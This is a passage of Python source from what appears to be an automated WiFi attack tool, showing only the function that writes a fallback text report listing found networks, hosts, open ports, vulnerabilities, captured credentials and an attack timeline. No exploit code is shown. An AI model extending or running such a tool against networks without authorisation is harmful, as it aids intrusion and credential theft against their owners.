                        lines.append("  " + "  |  ".join(f"{k}: {v}" for k, v in item.items()))
                    else:
                        lines.append(f"  {item}")
            lines.append("")

        section("WiFi NETWORKS FOUND", data.get("wifi_networks", []))
        section("DISCOVERED HOSTS",    data.get("hosts", []))
        section("OPEN PORTS",          data.get("ports", []))
        section("VULNERABILITIES",     data.get("vulnerabilities", []))
        section("CREDENTIALS",         data.get("creds", []))

        lines.extend([sep, "  ATTACK TIMELINE", thin, ""])
        for ev in data.get("events", []):
            lines.append(f"  {ev.get('time',''):<22}  {ev.get('message','')}")
        lines.append("")
        lines.append(sep)

        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
        except Exception as e:
            _p(f"  {red('✖')}  Could not write fallback report: {e}")


# End of WiFiAutomation — all automated attack functionality is in the class above.
